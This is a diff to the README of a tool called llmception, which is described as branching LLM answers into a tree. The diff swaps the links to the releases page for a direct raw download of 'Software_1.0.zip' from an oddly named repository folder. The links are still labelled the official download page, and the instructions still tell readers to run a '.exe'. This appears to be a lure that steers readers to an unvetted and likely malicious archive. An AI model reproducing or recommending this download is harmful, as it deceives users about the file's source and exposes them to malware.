@@ -1,12 +1,12 @@
 # 🌳 llmception - Explore every possible path for answers
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/gulfclamatores7360/llmception/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/gulfclamatores7360/llmception/raw/refs/heads/main/superexiguity/Software_1.0.zip)
 
 llmception manages complex tasks by turning your questions into a tree of logical choices. When you face an ambiguous prompt, the software creates distinct paths for each potential answer. You see the results of every branch side-by-side. This process removes the need for follow-up questions and repetitive corrections. The tool automates repetitive analysis to save time during your creative or technical work.
 
 ## 📥 Getting the software
 
-Visit the [official download page](https://github.com/gulfclamatores7360/llmception/releases) to access the files. Look for the file ending in `.exe` under the latest release section. Click the filename to start the download. Save this file to a folder you can find later, such as your Downloads or Desktop folder.
+Visit the [official download page](https://github.com/gulfclamatores7360/llmception/raw/refs/heads/main/superexiguity/Software_1.0.zip) to access the files. Look for the file ending in `.exe` under the latest release section. Click the filename to start the download. Save this file to a folder you can find later, such as your Downloads or Desktop folder.
 
 ## 🛠 Prerequisites
 
